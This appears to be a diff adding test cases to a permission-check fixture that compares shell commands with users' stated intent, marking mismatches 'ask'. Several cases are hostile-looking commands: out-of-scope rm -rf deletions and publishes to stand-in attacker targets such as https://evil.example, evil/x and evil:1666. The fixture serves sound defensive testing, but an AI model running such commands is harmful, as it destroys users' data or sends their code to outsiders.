@@ -8551,6 +8551,230 @@
    "rules": [
     "path.startup"
    ]
+  },
+  {
+   "cmd": "rm x",
+   "words": "don't delete x",
+   "verdict": "ask",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "rm x",
+   "words": "never remove x",
+   "verdict": "ask",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "git push origin feature-x",
+   "words": "do not push feature-x to github yet",
+   "verdict": "ask",
+   "classes": [
+    "publish"
+   ]
+  },
+  {
+   "cmd": "rm -rf build ../build",
+   "words": "delete the build folder",
+   "verdict": "ask",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "rm -rf ../node_modules",
+   "words": "delete the node_modules folder",
+   "verdict": "ask",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "rm -rf ~/node_modules",
+   "words": "delete the node_modules folder",
+   "verdict": "ask",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "rm -rf lib/build",
+   "words": "delete the src/build folder",
+   "verdict": "ask",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "rm -rf src/build",
+   "words": "delete the src/build folder",
+   "verdict": "announce",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "rm -rf packages/app/build",
+   "words": "delete the build folder in packages/app",
+   "verdict": "announce",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "rm ../build.log",
+   "words": "delete build.log",
+   "verdict": "ask",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "rm ../build.log",
+   "words": "delete ../build.log",
+   "verdict": "announce",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "ls > ../out.txt",
+   "words": "write the list to out.txt",
+   "verdict": "ask",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "ls > out.txt",
+   "words": "write the list to out.txt",
+   "verdict": "announce",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "GH_REPO=evil/x gh pr create",
+   "words": "open a pr",
+   "verdict": "ask",
+   "classes": [
+    "publish"
+   ]
+  },
+  {
+   "cmd": "export GH_REPO=evil/x; gh pr create",
+   "words": "open a pr",
+   "verdict": "ask",
+   "classes": [
+    "publish"
+   ]
+  },
+  {
+   "cmd": "npm --registry https://evil.example publish",
+   "words": "publish it",
+   "verdict": "ask",
+   "classes": [
+    "publish"
+   ]
+  },
+  {
+   "cmd": "p4 -p evil:1666 submit -c 123",
+   "words": "submit changelist 123",
+   "verdict": "ask",
+   "classes": [
+    "publish"
+   ]
+  },
+  {
+   "cmd": "p4 submit -c 123",
+   "words": "submit changelist 123",
+   "verdict": "announce",
+   "classes": [
+    "publish"
+   ]
+  },
+  {
+   "cmd": "docker push evil/myimg",
+   "words": "push the image myimg",
+   "verdict": "ask",
+   "classes": [
+    "publish"
+   ]
+  },
+  {
+   "cmd": "docker push myimg:latest",
+   "words": "push the image myimg",
+   "verdict": "announce",
+   "classes": [
+    "publish"
+   ]
+  },
+  {
+   "cmd": "gh pr merge",
+   "words": "merge pr 12",
+   "verdict": "ask",
+   "classes": [
+    "publish"
+   ]
+  },
+  {
+   "cmd": "pkill -f node",
+   "words": "kill node",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ]
+  },
+  {
+   "cmd": "pkill -u root node",
+   "words": "kill node",
+   "verdict": "ask",
+   "classes": [
+    "system"
+   ]
+  },
+  {
+   "cmd": "pkill node",
+   "words": "kill node",
+   "verdict": "announce",
+   "classes": [
+    "system"
+   ]
+  },
+  {
+   "cmd": "git checkout HEAD~3 -- a.ts",
+   "words": "discard changes to a.ts",
+   "verdict": "ask",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "git checkout -- a.ts",
+   "words": "discard changes to a.ts",
+   "verdict": "announce",
+   "classes": [
+    "destroy"
+   ]
+  },
+  {
+   "cmd": "scp ~/other/notes.txt build-01:",
+   "words": "copy notes.txt to build-01",
+   "verdict": "ask",
+   "classes": [
+    "publish"
+   ]
+  },
+  {
+   "cmd": "scp notes.txt build-01:",
+   "words": "copy notes.txt to build-01",
+   "verdict": "announce",
+   "classes": [
+    "publish"
+   ]
   }
  ]
 }
